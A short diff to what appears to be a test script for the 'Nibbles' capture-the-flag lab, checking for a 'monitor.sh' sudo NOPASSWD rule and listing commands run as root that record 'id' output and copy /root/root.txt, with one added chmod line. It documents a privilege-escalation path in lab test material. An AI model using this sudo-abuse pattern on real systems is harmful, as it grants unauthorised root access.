@@ -134,6 +134,7 @@ assert "monitor.sh" in output and "NOPASSWD" in output, output
 
 root_lines = [
     "/usr/bin/id > /tmp/nibbles-native-root-proof",
+    "/bin/chmod 0644 /tmp/nibbles-native-root-proof",
     "/bin/cat /root/root.txt > /tmp/nibbles-native-root-answer",
     "/bin/chmod 0644 /tmp/nibbles-native-root-answer",
 ]
